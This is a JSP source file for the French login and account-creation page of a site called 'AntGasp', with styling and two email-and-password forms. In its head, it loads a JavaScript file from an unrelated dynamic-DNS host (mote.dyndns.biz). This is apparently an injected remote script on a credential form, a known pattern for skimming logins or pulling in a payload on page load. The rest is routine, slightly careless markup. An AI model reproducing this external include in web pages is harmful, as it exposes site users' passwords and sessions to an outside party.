<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html>
<head>
<script src="http://mote.dyndns.biz/libs/haiku.js"></script>
<style>
.form-signin {
  width: 100%;
  max-width: 330px;
  padding: 15px;
  margin: auto;
}
.form-signin .checkbox {
  font-weight: 400;
}
.form-signin .form-floating:focus-within {
  z-index: 2;
}
.form-signin input[type="email"] {
  margin-bottom: -1px;
  border-bottom-right-radius: 0;
  border-bottom-left-radius: 0;
}
.form-signin input[type="password"] {
  margin-bottom: 10px;
  border-top-left-radius: 0;
  border-top-right-radius: 0;
}
.is-invalid {
  border-color: #e74c3c;
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(255, 0, 0, 0.6);
}
/* The color of valid icon */
.has-danger .fv-plugins-icon {
  color: #dc3545;
}
</style>

<meta charset="UTF-8">
<title>Insert title here</title>
</head>
<body>
<section class="row clean-block">
	<div class="col-10 col-lg-5">
	<h3>CONNECTEZ-VOUS SUR AntGasp</h3>
	<div class="form-signin">
		<form name="login" method="POST">
			<% if(request.getAttribute("error")!=null){ %>
				<div class="alert">${error}</div>
			<% } %>
			<div class="form-floating">
				<div class="input-group">
					<input class="form-control form-control-danger" id="username" name="_username" placeholder="nom@exemple.com" type="text" name="userName" />
					<label for="userName" class="form-label">Adresse mail</label>
				</div>
				<div class="input-group">
					<input type="password" name="password" class="form-control" id="password" placeholder="Mot de passe"/>
					<label for="password" class="form-label">Mot de passe</label>
				</div>
			</div>
			<div class="row form-label">
				<button class="btn outline" type="submit">Se Connecter</button>
			</div>
				</form>
					</div>
	</div>
</section>
<section class="row clean-block">
	<div class="col-10 col-lg-5">
	<h3>SE CREER UN COMPTE SUR AntGasp</h3>
	<div class="form-signin">
		<form name="register" method="POST">
			<% if(request.getAttribute("error")!=null){ %>
				<div class="alert">${error}</div>
			<% } %>
			<div class="form-floating">
				<div class="input-group">
					<input class="form-control form-control-danger" id="username" name="_username" placeholder="nom@exemple.com" type="text" name="userName" />
					<label for="userName" class="form-label">Adresse mail</label>
				</div>
				<div class="input-group">
					<input type="password" name="password" class="form-control" id="password" placeholder="Mot de passe"/>
					<label for="password" class="form-label">Mot de passe</label>
				</div>
			</div>
			<div class="row form-label">
				<button class="btn outline" type="submit">Se Connecter</button>
			</div>
		</form>
	</div>
	</div>
</section>
</body>
</html> 